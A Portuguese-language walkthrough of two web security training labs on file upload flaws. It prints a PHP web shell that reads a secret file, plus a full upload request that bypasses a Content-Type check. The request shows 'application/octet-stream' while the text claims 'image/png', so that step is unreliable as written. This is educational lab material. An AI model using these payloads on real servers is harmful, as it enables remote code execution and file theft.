# File upload vulnerabilities

**Vulnerabilidades de *file upload*** ocorrem quando uma aplicação web permite o envio de arquivos sem validar adequadamente seu nome, extensão, tipo MIME, conteúdo ou destino de armazenamento. Isso permite que um atacante envie arquivos maliciosos, como web shells, e os execute no servidor, resultando em execução remota de código (RCE), além de outros impactos como sobrescrita de arquivos críticos, XSS armazenado, XXE (via SVG/XML), *path traversal* e negação de serviço. A falha decorre, em geral, de validações apenas no lado do cliente, listas de bloqueio incompletas ou da confiança em dados controlados pelo usuário, como o cabeçalho `Content-Type`, como visto adiante.

## Lab 1: Remote code execution via web shell upload

> **Objetivo:** (A) criar e subir um web shell em PHP, (B) exfiltrar o conteúdo de `/home/carlos/secret` e (C) encontrar uma flag.

A primeira coisa que faremos é logar com o usuário Wiener, obtendo acesso ao painel de sua conta, onde é possível ver alguns campos, dentre os quais está o que nos interessa: um input para upload de arquivos (que deveriam ser apenas de imagem), usado para alterar a foto de perfil.

Ocorre que é possível enviar arquivos que não sejam de imagem, uma vez que isso não está devidamente configurado/filtrado pela aplicação. Assim, basta usarmos o seguinte script em PHP como “imagem de perfil”:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>

```

Para chegarmos à flag, basta clicar no link do script, visível no código-fonte ou no corpo do site:

```html
<p><img src="/files/avatars/exploit.php" class=avatar></p>

```

Objetivo concluído.

## Lab 2: Web shell upload via Content-Type restriction bypass

> **Objetivo:** (A) criar e subir um web shell em PHP, (B) exfiltrar o conteúdo de `/home/carlos/secret` e (C) encontrar a flag final.

O processo de descoberta dessa última flag segue os mesmos passos do Lab 1 até o ponto em que é preciso contornar os filtros de arquivo, diretamente na requisição (*client-side*). A requisição POST, capturada via Replay do Caido:

```http
POST /my-account/avatar HTTP/1.1
Host: 0a0700f660076.web-security-academy.net
...
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: session=tVYFN7

------WebKitFormBoundary0PGhzGhALV3o9ObQ
Content-Disposition: form-data; name="avatar"; filename="exploit2.php"
Content-Type: application/octet-stream // O bypass entra aqui!

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary0PGhzGhALV3o9ObQ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary0PGhzGhALV3o9ObQ
Content-Disposition: form-data; name="csrf"

LmwteAWscwrKEvjSeGdTe4nsYeb
------WebKitFormBoundary0PGhzGhALV3o9ObQ--

```

Alteramos o cabeçalho `Content-Type` da parte do arquivo no upload para `image/png`, e esse é o bypass. O servidor valida esse valor, que é controlado pelo cliente, sem inspecionar o conteúdo real do arquivo (magic bytes, extensão ou MIME detectado no servidor). Assim, o arquivo é aceito como imagem, embora seja interpretado e executado como PHP.

A resposta HTTP confirma o upload. A partir daqui, cheguemos a flag final, clicando no link do script no código-fonte ou no corpo do site, como demonstrado anteriormente.

Objetivo concluído!
